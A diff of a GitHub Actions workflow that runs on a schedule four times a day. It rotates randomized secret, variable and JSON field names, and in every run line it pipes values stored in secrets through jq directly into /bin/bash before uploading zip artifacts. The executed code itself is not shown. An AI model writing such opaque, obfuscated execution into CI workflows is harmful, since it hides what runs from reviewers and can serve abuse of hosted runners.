@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '30 4,10,16,22 * * *'
+    - cron: '55 4,10,16,22 * * *'
 concurrency:
   group: ${{ github.workflow }}
   cancel-in-progress: false
@@ -15,19 +15,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: Setup and run
         env:
-          ns50233: ${{ secrets.ns50233 }}
+          xzclg3: ${{ secrets.xzclg3 }}
         run: |
-          printf '%s' "$ns50233" | jq -r .fhy17476 | /bin/bash
-          printf '%s' "$ikw5647" | jq -r .bgx315 | /bin/bash
-          printf '%s' "$xwklw708" | jq -r .l411 | /bin/bash
-          printf '%s' "$jjro5" | jq -r .tf070 | /bin/bash
-          echo $o93098 | jq -r .oog2 | /bin/bash
-          printf '%s' "$terh2285" | jq -r .oq10415 | /bin/bash
+          printf '%s' "$xzclg3" | jq -r .ppl8 | /bin/bash
+          echo $u521 | jq -r .eg1 | /bin/bash
+          echo $ux79 | jq -r .dmbma18754 | /bin/bash
+          printf '%s' "$jkty53170" | jq -r .zk927 | /bin/bash
+          printf '%s' "$bsbs12273" | jq -r .wkvgn234 | /bin/bash
+          printf '%s' "$hnqf9237" | jq -r .bpiae31579 | /bin/bash
 
       - name: Upload data
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: idVFdic8
+          name: aAL3wMY2
           path: "*.zip"
           retention-days: 1
